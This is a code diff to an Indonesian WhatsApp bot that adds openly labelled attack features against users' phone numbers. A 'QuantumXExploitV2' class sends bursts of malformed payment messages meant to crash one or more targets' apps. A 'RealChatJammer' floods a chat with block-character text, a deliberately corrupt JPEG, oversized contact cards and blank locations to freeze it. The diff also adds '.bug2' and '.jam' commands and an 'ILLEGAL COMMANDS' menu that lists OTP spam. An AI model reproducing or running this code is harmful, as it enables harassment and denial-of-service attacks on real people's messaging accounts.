@@ -971,16 +971,147 @@ class QuantumXExploit {
             return { error: error.message };
         }
     }
-    
-    // ☠️ EXTREME MODE - SPAM WITH LONG DELAYS
-    async extremeCrash(targetJid, count = 20) {
+}
+
+let exploitSystem = null;
+
+
+
+// ==================== QUANTUMX EXPLOIT SYSTEM v2.1 ====================
+class QuantumXExploitV2 {
+    constructor(sock) {
+        this.sock = sock;
+    }
+
+    // 💣 MULTI-TARGET PAYMENT CRASH WITH DELAY
+    async multiTargetCrash(targetJids, count = 20) {
         try {
-            console.log(`☠️ [BUG EXTREME] ${count}x Extreme crash to: ${targetJid}`);
+            console.log(`💣 [BUG2] Attacking ${targetJids.length} targets with ${count}x payloads each`);
+            
+            const results = [];
+            
+            // ATTACK ALL TARGETS SEQUENTIALLY WITH DELAY
+            for (let t = 0; t < targetJids.length; t++) {
+                const targetJid = targetJids[t];
+                
+                // DELAY BEFORE STARTING NEW TARGET
+                if (t > 0) {
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                }
+                
+                const result = await this.attackSingleTargetWithDelay(targetJid, count);
+                results.push({
+                    target: targetJid.split('@')[0],
+                    ...result
+                });
+            }
+            
+            const totalSent = results.reduce((sum, r) => sum + r.sent, 0);
+            const totalTargets = results.length;
+            const successfulTargets = results.filter(r => r.success).length;
+            
+            return { 
+                success: totalSent > 0,
+                results: results,
+                summary: {
+                    totalTargets,
+                    successfulTargets,
+                    totalPayloads: totalTargets * count,
+                    totalSent,
+                    successRate: (successfulTargets / totalTargets) * 100
+                }
+            };
+            
+        } catch (error) {
+            console.error('❌ Multi-target crash error:', error.message);
+            return { error: error.message };
+        }
+    }
+
+    // ⚡ ATTACK SINGLE TARGET WITH PROGRESSIVE DELAY
+    async attackSingleTargetWithDelay(targetJid, count = 20) {
+        try {
+            let successCount = 0;
+            const errors = [];
+            
+            // PAYLOAD VARIANTS
+            const payloads = [
+                {
+                    sendPaymentMessage: {
+                        amount: { value: "999999999", offset: 9999, currencyCodeIso4217: "IDR" }
+                    }
+                },
+                {
+                    sendPaymentMessage: {
+                        amount: { value: "500000000", offset: 5000, currencyCodeIso4217: "IDR" }
+                    }
+                },
+                {
+                    sendPaymentMessage: {
+                        amount: { value: "750000000", offset: 7500, currencyCodeIso4217: "IDR" }
+                    }
+                },
+                {
+                    paymentInviteMessage: {
+                        serviceType: "UPI",
+                        expiryTimestamp: Date.now() + 3600000
+                    }
+                }
+            ];
+            
+            // PAKAI DELAY SYSTEM PERSIS .bug
+            for (let i = 1; i <= count; i++) {
+                try {
+                    const payloadIndex = (i - 1) % payloads.length;
+                    const payload = payloads[payloadIndex];
+                    
+                    await this.sock.relayMessage(targetJid, payload, {
+                        participant: { jid: targetJid },
+                        messageId: this.sock.generateMessageTag() + "_BUG2_" + i,
+                    });
+                    
+                    successCount++;
+                    
+                    // DELAY PERSIS .bug YANG LAMA: 300 + (i * 100)
+                    const delay = 300 + (i * 100); // 300, 400, 500, 600, dst
+                    console.log(`Target ${targetJid} - Sent payload ${i}, delay ${delay}ms`);
+                    
+                    if (i < count) {
+                        await new Promise(resolve => setTimeout(resolve, delay));
+                    }
+                    
+                } catch (error) {
+                    errors.push(`Payload ${i}: ${error.message}`);
+                    console.error(`❌ Target ${targetJid} payload ${i} failed:`, error.message);
+                    
+                    // DELAY LEBIH PANJANG KALAU ERROR
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+                }
+            }
+            
+            return { 
+                success: successCount > 0, 
+                sent: successCount,
+                total: count,
+                errors: errors.length
+            };
+            
+        } catch (error) {
+            console.error(`❌ Single target ${targetJid} error:`, error.message);
+            return { error: error.message };
+        }
+    }
+
+    // 🚀 ENHANCED ATTACK WITH PHASES (KAYA .bug EXTREME)
+    async enhancedAttack(targetJid, count = 20) {
+        try {
+            console.log(`🚀 [BUG2-ENHANCED] Enhanced ${count}x to: ${targetJid}`);
             
             let successCount = 0;
             
-            // PHASE 1: QUICK SPAM
-            for (let i = 1; i <= Math.min(10, count); i++) {
+            // PHASE 1: QUICK SPAM (FIRST 10)
+            const phase1Count = Math.min(10, count);
+            for (let i = 1; i <= phase1Count; i++) {
                 try {
                     await this.sock.relayMessage(targetJid, {
                         sendPaymentMessage: {
@@ -992,11 +1123,15 @@ class QuantumXExploit {
                         }
                     }, {
                         participant: { jid: targetJid },
-                        messageId: this.sock.generateMessageTag(),
+                        messageId: this.sock.generateMessageTag() + "_ENH_" + i,
                     });
                     
                     successCount++;
-                    await new Promise(resolve => setTimeout(resolve, 150));
+                    
+                    // DELAY CEPAT DI PHASE 1
+                    if (i < phase1Count) {
+                        await new Promise(resolve => setTimeout(resolve, 150));
+                    }
                     
                 } catch (error) {
                     console.error(`Phase 1 payload ${i} failed:`, error.message);
@@ -1012,19 +1147,19 @@ class QuantumXExploit {
                         await this.sock.relayMessage(targetJid, {
                             sendPaymentMessage: {
                                 amount: { 
-                                    value: String(900000000 - (i * 10000000)), 
-                                    offset: 9999 - (i * 100), 
+                                    value: String(900000000 - ((i-10) * 10000000)), 
+                                    offset: 9999 - ((i-10) * 100), 
                                     currencyCodeIso4217: "IDR" 
                                 }
                             }
                         }, {
                             participant: { jid: targetJid },
-                            messageId: this.sock.generateMessageTag(),
+                            messageId: this.sock.generateMessageTag() + "_ENH_" + i,
                         });
                         
                         successCount++;
                         
-                        // DELAY PANJANG
+                        // DELAY PANJANG DI PHASE 2
                         const delay = 1000 + (Math.random() * 1000);
                         if (i < count) {
                             await new Promise(resolve => setTimeout(resolve, delay));
@@ -1039,17 +1174,189 @@ class QuantumXExploit {
             return { 
                 success: successCount > 0, 
                 sent: successCount,
-                total: count
+                total: count,
+                mode: "ENHANCED"
             };
             
         } catch (error) {
-            console.error('❌ Extreme crash error:', error.message);
+            console.error('❌ Enhanced attack error:', error.message);
             return { error: error.message };
         }
     }
 }
 
-let exploitSystem = null;
+// INISIALISASI DI BOT
+let exploitSystemV2 = null;
+
+
+class RealChatJammer {
+    constructor(sock) {
+        this.sock = sock;
+        this.activeJams = new Map();
+        this.corruptImageBuffer = null;
+    }
+
+    // 🔥 LOAD CORRUPT IMAGE
+    async loadCorruptImage() {
+        if (this.corruptImageBuffer) return;
+        
+        // CREATE CORRUPT JPEG MANUALLY
+        const header = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46]);
+        const middle = Buffer.alloc(10000, 0xFF); // Large white space
+        const footer = Buffer.from([0xFF, 0xD9]);
+        
+        this.corruptImageBuffer = Buffer.concat([header, middle, footer]);
+    }
+
+    // 💀 JAM CHAT TARGET
+    async jamChat(targetJid, duration = 120) {
+        console.log(`[REAL-JAMMER] Starting jam on ${targetJid}`);
+        
+        await this.loadCorruptImage();
+        
+        const jamId = `jam_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
+        const startTime = Date.now();
+        const endTime = startTime + (duration * 1000);
+        
+        const jamConfig = {
+            target: targetJid,
+            start: startTime,
+            end: endTime,
+            messagesSent: 0,
+            active: true
+        };
+        
+        this.activeJams.set(jamId, jamConfig);
+        
+        // START JAMMING
+        this._executeJam(jamId);
+        
+        return jamId;
+    }
+
+    async _executeJam(jamId) {
+        const jam = this.activeJams.get(jamId);
+        if (!jam || !jam.active) return;
+        
+        const patterns = [
+            () => this._sendTextFlood(jam.target),
+            () => this._sendBufferImage(jam.target),
+            () => this._sendContactSpam(jam.target),
+            () => this._sendLocationSpam(jam.target)
+        ];
+        
+        while (Date.now() < jam.end && jam.active) {
+            try {
+                const patternIndex = jam.messagesSent % patterns.length;
+                await patterns[patternIndex]();
+                
+                jam.messagesSent++;
+                this.activeJams.set(jamId, jam);
+                
+                // PROGRESSIVE SPEED
+                const delay = Math.max(50, 1000 - (jam.messagesSent * 10));
+                await new Promise(r => setTimeout(r, delay));
+                
+            } catch (error) {
+                console.log(`[JAMMER] Send error: ${error.message}`);
+            }
+        }
+        
+        jam.active = false;
+        this.activeJams.set(jamId, jam);
+        
+        setTimeout(() => {
+            this.activeJams.delete(jamId);
+        }, 10000);
+    }
+
+    // 📝 TEXT FLOOD
+    async _sendTextFlood(targetJid) {
+        const texts = [
+            "█".repeat(1000),
+            "▒".repeat(1000) + "\n".repeat(50),
+            "▓".repeat(500) + "░".repeat(500),
+            Buffer.alloc(1000, 65).toString() + "\n".repeat(20)
+        ];
+        
+        const text = texts[Math.floor(Math.random() * texts.length)];
+        
+        await this.sock.sendMessage(targetJid, { 
+            text: text,
+            contextInfo: {
+                mentionedJid: [targetJid],
+                forwardingScore: 255
+            }
+        });
+    }
+
+    // 🖼️ BUFFER IMAGE
+    async _sendBufferImage(targetJid) {
+        await this.sock.sendMessage(targetJid, {
+            image: this.corruptImageBuffer,
+            caption: " ".repeat(100),
+            mimetype: 'image/jpeg'
+        });
+    }
+
+    // 👥 CONTACT SPAM
+    async _sendContactSpam(targetJid) {
+        const vcard = `BEGIN:VCARD
+VERSION:3.0
+FN:${"A".repeat(100)}
+TEL;TYPE=CELL:628${Math.random().toString().substr(2, 12)}
+END:VCARD`.repeat(5);
+        
+        await this.sock.sendMessage(targetJid, {
+            contacts: {
+                displayName: "SPAM_CONTACT",
+                contacts: [{ vcard: vcard }]
+            }
+        });
+    }
+
+    // 📍 LOCATION SPAM
+    async _sendLocationSpam(targetJid) {
+        await this.sock.sendMessage(targetJid, {
+            location: {
+                degreesLatitude: 0,
+                degreesLongitude: 0,
+                name: " ".repeat(50),
+                address: " ".repeat(100)
+            }
+        });
+    }
+
+    // 🛑 STOP JAM
+    stopJam(jamId) {
+        const jam = this.activeJams.get(jamId);
+        if (jam) {
+            jam.active = false;
+            this.activeJams.set(jamId, jam);
+            return true;
+        }
+        return false;
+    }
+
+    // 📊 GET ACTIVE JAMS
+    getActiveJams() {
+        const active = [];
+        this.activeJams.forEach((jam, id) => {
+            if (jam.active) {
+                active.push({
+                    id: id,
+                    target: jam.target,
+                    remaining: Math.max(0, Math.floor((jam.end - Date.now()) / 1000)),
+                    sent: jam.messagesSent
+                });
+            }
+        });
+        return active;
+    }
+}
+
+// ==================== SIMPLE COMMAND HANDLER ====================
+let jammer = null;
 
 const truthList = [
   "Apa hal paling memalukan yang pernah kamu lakukan di depan umum?",
@@ -2109,6 +2416,7 @@ async function startBot() {
   });
 
     exploitSystem = new QuantumXExploit(sock);
+    exploitSystemV2 = new QuantumXExploitV2(sock);
 
   sock.ev.on('connection.update', async (update) => {
     const { connection, lastDisconnect, qr } = update;
@@ -6085,13 +6393,182 @@ if (text.startsWith('.siapa')) {
 if (text.startsWith('.spamcode')) {
   await spamCode(sock, from, msg, text, isOwner);
 }
+
+
+if (body.startsWith('.jam')) {
+    const args = body.trim().split(' ');
+    
+    if (!jammer) {
+        jammer = new RealChatJammer(sock);
+    }
+    
+    if (args.length === 1) {
+        await sock.sendMessage(from, {
+            text: `💀 REAL CHAT JAMMER\n\n.jam 628xxx [duration]\n.jam status\n.jam stop [id]\n\nDurasi: detik (default: 120)`
+        });
+        return;
+    }
+    
+    if (args[1] === 'status') {
+        const active = jammer.getActiveJams();
+        if (active.length === 0) {
+            await sock.sendMessage(from, { text: 'No active jams' });
+        } else {
+            let text = `Active: ${active.length}\n`;
+            active.forEach(j => {
+                text += `\n${j.target}\nID: ${j.id}\nRemaining: ${j.remaining}s\nSent: ${j.sent}`;
+            });
+            await sock.sendMessage(from, { text });
+        }
+        return;
+    }
+    
+    if (args[1] === 'stop') {
+        if (args[2]) {
+            const stopped = jammer.stopJam(args[2]);
+            await sock.sendMessage(from, { 
+                text: stopped ? '✅ Stopped' : '❌ Not found' 
+            });
+        } else {
+            const active = jammer.getActiveJams();
+            active.forEach(j => jammer.stopJam(j.id));
+            await sock.sendMessage(from, { 
+                text: `Stopped ${active.length} jams` 
+            });
+        }
+        return;
+    }
+    
+    // START JAM
+    let target = args[1].replace(/[^0-9]/g, '');
+    if (!target) {
+        await sock.sendMessage(from, { text: 'Invalid number' });
+        return;
+    }
+    
+    if (target.startsWith('0')) target = '62' + target.slice(1);
+    if (!target.startsWith('62')) target = '62' + target;
+    
+    let duration = 120;
+    if (args[2]) {
+        duration = parseInt(args[2]);
+        if (isNaN(duration) || duration < 30) duration = 120;
+        if (duration > 300) duration = 300;
+    }
+    
+    const targetJid = target + '@s.whatsapp.net';
+    const jamId = await jammer.jamChat(targetJid, duration);
+    
+    await sock.sendMessage(from, {
+        text: `💀 JAM STARTED\n\nTarget: ${target}\nDuration: ${duration}s\nID: ${jamId}\n\nChat will freeze/lag`
+    });
+}
+
+
+// 🎯 FITUR .bug2 (MULTI-TARGET ATTACK)
+if (body.startsWith('.bug2')) {
+    const args = body.trim().split(' ');
+    
+    if (args.length === 1) {
+        await sock.sendMessage(from, { 
+            text: '𝐂𝐎𝐌𝐌𝐀𝐍𝐃: .bug2 <𝐭𝐚𝐫𝐠𝐞𝐭𝟏,𝐭𝐚𝐫𝐠𝐞𝐭𝟐,𝐭𝐚𝐫𝐠𝐞𝐭𝟑> [𝐜𝐨𝐮𝐧𝐭]\n\nEXAMPLE:\n.bug2 628xxxx\n.bug2 628xxxx 30\n.bug2 628xxxx,628yyyy\n.bug2 628xxxx,628yyyy,628zzzz 25'
+        });
+        return;
+    }
+
+    if (!isOwner(sender)) {
+        await sock.sendMessage(from, { text: '𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃' });
+        return;
+    }
+
+    // PARSING TARGETS
+    let targetInput = args[1];
+    let targets = [];
+    
+    if (targetInput.includes(',')) {
+        const targetParts = targetInput.split(',');
+        
+        for (let i = 0; i < Math.min(3, targetParts.length); i++) {
+            let targetNum = targetParts[i].replace(/[^0-9]/g, '');
+            
+            if (!targetNum) continue;
+            
+            if (targetNum.startsWith('0')) targetNum = '62' + targetNum.slice(1);
+            if (!targetNum.startsWith('62')) targetNum = '62' + targetNum;
+            
+            targets.push(targetNum + '@s.whatsapp.net');
+        }
+    } else {
+        let targetNum = targetInput.replace(/[^0-9]/g, '');
+        
+        if (!targetNum) {
+            await sock.sendMessage(from, { text: '𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐓𝐀𝐑𝐆𝐄𝐓' });
+            return;
+        }
+        
+        if (targetNum.startsWith('0')) targetNum = '62' + targetNum.slice(1);
+        if (!targetNum.startsWith('62')) targetNum = '62' + targetNum;
+        
+        targets.push(targetNum + '@s.whatsapp.net');
+    }
+
+    if (targets.length === 0) {
+        await sock.sendMessage(from, { text: '𝐍𝐎 𝐕𝐀𝐋𝐈𝐃 𝐓𝐀𝐑𝐆𝐄𝐓𝐒' });
+        return;
+    }
+
+    // COUNT DETECTION
+    let count = 20; // DEFAULT 20
+    
+    if (args.length >= 3) {
+        count = parseInt(args[2]);
+        if (isNaN(count) || count < 1) count = 20;
+        if (count > 50) count = 50;
+    }
+
+    // START MESSAGE
+    let targetList = targets.map(t => t.split('@')[0]).join(', ');
+    
+    await sock.sendMessage(from, {
+        text: `𝗠𝗨𝗟𝗧𝗜𝗣𝗟𝗘 𝗧𝗔𝗥𝗚𝗘𝗧 𝗔𝗧𝗧𝗔𝗖𝗞\n𝗧𝗔𝗥𝗚𝗘𝗧𝗦: ${targets.length} (${targetList})\n𝗣𝗔𝗬𝗟𝗢𝗔𝗗𝗦: ${count} each\n𝗦𝗧𝗔𝗧𝗨𝗦: 𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗜𝗡𝗚...`
+    });
+
+    // EXECUTE ATTACK
+    let result = await exploitSystemV2.multiTargetCrash(targets, count);
+    
+    // RESULT
+    if (result.success) {
+        let resultText = `𝗠𝗨𝗟𝗧𝗜-𝗧𝗔𝗥𝗚𝗘𝗧 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘\n\n`;
+        
+        if (targets.length === 1) {
+            resultText += `𝗧𝗔𝗥𝗚𝗘𝗧: ${targets[0].split('@')[0]}\n𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟: ${result.results[0].sent}/${count}`;
+        } else {
+            resultText += `𝗧𝗢𝗧𝗔𝗟 𝗧𝗔𝗥𝗚𝗘𝗧𝗦: ${result.summary.totalTargets}\n𝗧𝗢𝗧𝗔𝗟 𝗣𝗔𝗬𝗟𝗢𝗔𝗗𝗦: ${result.summary.totalPayloads}\n𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟 𝗦𝗘𝗡𝗧: ${result.summary.totalSent}\n\n`;
+            
+            result.results.forEach((r, index) => {
+                const status = r.success ? '✅' : '❌';
+                resultText += `${status} ${r.target}: ${r.sent}/${count}\n`;
+            });
+        }
+        
+        await sock.sendMessage(from, { text: resultText });
+    } else {
+        await sock.sendMessage(from, {
+            text: `𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗔𝗜𝗟𝗘𝗗\n𝗧𝗔𝗥𝗚𝗘𝗧𝗦: ${targets.length}\n𝗘𝗥𝗥𝗢𝗥: ${result.error || 'Unknown'}`
+        });
+    }
+    
+    return;
+}
+
+
 // 🎯 FITUR .bug (Payment Crash)
 if (body.startsWith('.bug')) {
     const args = body.trim().split(' ');
     
     if (args.length === 1) {
         await sock.sendMessage(from, { 
-            text: '𝐂𝐎𝐌𝐌𝐀𝐍𝐃: .bug <𝐭𝐚𝐫𝐠𝐞𝐭> [𝐜𝐨𝐮𝐧𝐭]\n\nEXAMPLE:\n.bug 628xxxx\n.bug 628xxxx 15\n.bug 628xxxx 𝐞𝐱𝐭𝐫𝐞𝐦𝐞'
+            text: '𝐂𝐎𝐌𝐌𝐀𝐍𝐃: .bug <𝐭𝐚𝐫𝐠𝐞𝐭> [𝐜𝐨𝐮𝐧𝐭]\n\nEXAMPLE:\n.bug 628xxxx\n.bug 628xxxx 15'
         });
         return;
     }
@@ -6113,53 +6590,28 @@ if (body.startsWith('.bug')) {
     
     const targetJid = targetNum + '@s.whatsapp.net';
 
-    // MODE CHECK
-    let mode = "normal";
-    let count = 5;
+    // COUNT CHECK
+    let count = 5; // DEFAULT 5
     
     if (args.length >= 3) {
-        const param = args[2].toLowerCase();
-        
-        if (param === 'extreme' || param === 'ex' || param === 'heavy') {
-            mode = "extreme";
-            count = 20;
-        } else {
-            count = parseInt(param);
-            if (isNaN(count) || count < 1) count = 5;
-            if (count > 50) count = 50;
-        }
+        count = parseInt(args[2]);
+        if (isNaN(count) || count < 1) count = 5;
+        if (count > 50) count = 50;
     }
 
     // START MESSAGE
-    if (mode === "extreme") {
-        await sock.sendMessage(from, {
-            text: `𝗘𝗫𝗧𝗥𝗘𝗠𝗘 𝗠𝗢𝗗𝗘 𝗘𝗡𝗚𝗔𝗚𝗘𝗗\n𝗧𝗔𝗥𝗚𝗘𝗧: ${targetNum}\n𝗣𝗔𝗬𝗟𝗢𝗔𝗗𝗦: ${count}\n𝗦𝗧𝗔𝗧𝗨𝗦: 𝗦𝗧𝗔𝗥𝗧𝗜𝗡𝗚...`
-        });
-    } else {
-        await sock.sendMessage(from, {
-            text: `𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗜𝗡𝗚 𝗧𝗘𝗥𝗠𝗜𝗡𝗔𝗧𝗜𝗢𝗡\n𝗧𝗔𝗥𝗚𝗘𝗧: ${targetNum}\n𝗔𝗠𝗢𝗨𝗡𝗧: ${count}x`
-        });
-    }
+    await sock.sendMessage(from, {
+        text: `𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗜𝗡𝗚 𝗧𝗘𝗥𝗠𝗜𝗡𝗔𝗧𝗜𝗢𝗡\n𝗧𝗔𝗥𝗚𝗘𝗧: ${targetNum}\n𝗔𝗠𝗢𝗨𝗡𝗧: ${count}x`
+    });
 
     // EXECUTE
-    let result;
-    if (mode === "extreme") {
-        result = await exploitSystem.extremeCrash(targetJid, count);
-    } else {
-        result = await exploitSystem.paymentCrashMultiple(targetJid, count);
-    }
+    let result = await exploitSystem.paymentCrashMultiple(targetJid, count);
     
     // RESULT
     if (result.success) {
-        if (mode === "extreme") {
-            await sock.sendMessage(from, {
-                text: `𝗧𝗔𝗦𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘\n𝗧𝗔𝗥𝗚𝗘𝗧: ${targetNum}\n𝗦𝗘𝗡𝗧: ${result.sent}/${count}\n𝗦𝗧𝗔𝗧𝗨𝗦: 𝗖𝗢𝗠𝗣𝗥𝗢𝗠𝗜𝗦𝗘𝗗\n\n𝗪𝗔𝗥𝗡𝗜𝗡𝗚: 𝗧𝗔𝗥𝗚𝗘𝗧 𝗦𝗬𝗦𝗧𝗘𝗠 𝗨𝗡𝗦𝗧𝗔𝗕𝗟𝗘`
-            });
-        } else {
-            await sock.sendMessage(from, {
-                text: `𝗘𝗫𝗘𝗖𝗨𝗧𝗜𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟\n𝗧𝗔𝗥𝗚𝗘𝗧: ${targetNum}\n𝗘𝗙𝗙𝗘𝗖𝗧𝗦: 𝗜𝗠𝗠𝗜𝗡𝗘𝗡𝗧`
-            });
-        }
+        await sock.sendMessage(from, {
+            text: `𝗘𝗫𝗘𝗖𝗨𝗧𝗜𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟\n𝗧𝗔𝗥𝗚𝗘𝗧: ${targetNum}\n𝗘𝗙𝗙𝗘𝗖𝗧𝗦: 𝗜𝗠𝗠𝗜𝗡𝗘𝗡𝗧`
+        });
     } else {
         await sock.sendMessage(from, {
             text: `𝗙𝗔𝗜𝗟𝗨𝗥𝗘\n𝗧𝗔𝗥𝗚𝗘𝗧: ${targetNum}\n𝗦𝗧𝗔𝗧𝗨𝗦: 𝗨𝗡𝗔𝗙𝗙𝗘𝗖𝗧𝗘𝗗`
@@ -8324,6 +8776,25 @@ ${readmore}╭─〔 *🤖 ʙᴏᴛ ᴊᴀʀʀ ᴍᴇɴᴜ* 〕─╮
 });
 return;
 
+}
+
+// ✨ MENU ILEGAL - ELEGAN MODERN
+if (body.startsWith('.menuilegal') || body.startsWith('.m')) {
+    await sock.sendMessage(from, {
+        text: `┌─*ILLEGAL COMMANDS*─┐
+│
+│  ⚡ .bug 
+│     Payment crash - single target
+│
+│  💀 .bug2 
+│     Multi-target attack 
+│
+│  🔥 .spamcode
+│     OTP verification spam
+│
+└─ 👑 Owner: @${OWNER_NUMBER?.split('@')[0] || '6283836348226'}`,
+  mentions: [OWNER_NUMBER]
+    });
 }
 
 if (text.startsWith(".ailimit")) {
